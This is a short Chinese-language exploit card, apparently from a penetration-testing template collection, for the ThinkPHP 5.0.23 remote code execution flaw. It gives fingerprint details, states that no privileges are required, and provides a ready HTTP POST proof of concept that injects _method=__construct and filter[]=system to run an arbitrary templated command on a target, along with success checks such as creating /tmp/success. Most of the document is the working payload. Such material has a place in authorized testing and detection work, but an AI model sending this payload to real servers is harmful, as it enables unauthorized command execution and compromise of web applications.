# ThinkPHP 5.0.23 RCE (5.0.23-rce)

## 指纹特征
- 服务: ThinkPHP 5.0.23
- 端口: 8080 (默认)

## 利用矩阵
| 触发方式 | 路径 | 权限要求 |
| :--- | :--- | :--- |
| Request 类方法调用注入 | `/index.php` | 无 |

## PoC 指令

通过 `_method` 伪造请求方法并注入 `filter` 实现代码执行：

```http
POST /index.php?s=captcha HTTP/1.1
Host: {{TARGET}}:8080
Content-Type: application/x-www-form-urlencoded

_method=__construct&filter[]=system&method=get&server[REQUEST_METHOD]={{COMMAND}}
```

## Success Signal
- **状态验证**: 执行系统命令并获得回显。
- **物理验证**: 执行预期的命令（如 `touch /tmp/success`）。
